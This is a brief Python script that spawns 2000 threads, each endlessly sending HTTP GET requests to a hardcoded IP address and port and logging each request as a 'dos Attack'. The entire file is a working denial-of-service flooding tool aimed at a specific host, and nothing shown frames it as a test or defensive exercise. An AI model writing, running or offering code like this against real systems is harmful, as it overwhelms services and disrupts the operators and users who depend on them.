import requests
import threading

url = "http://13.237.94.113:8009/"
thread_number = 2000

def task(person):
    i=0
    while True: 
        print(f"[person {person}] dos Attack {i}")
        response = requests.get(url)
        i=i+1

for person in range(thread_number):
    t = threading.Thread(target=task,args=[person])
    t.start()


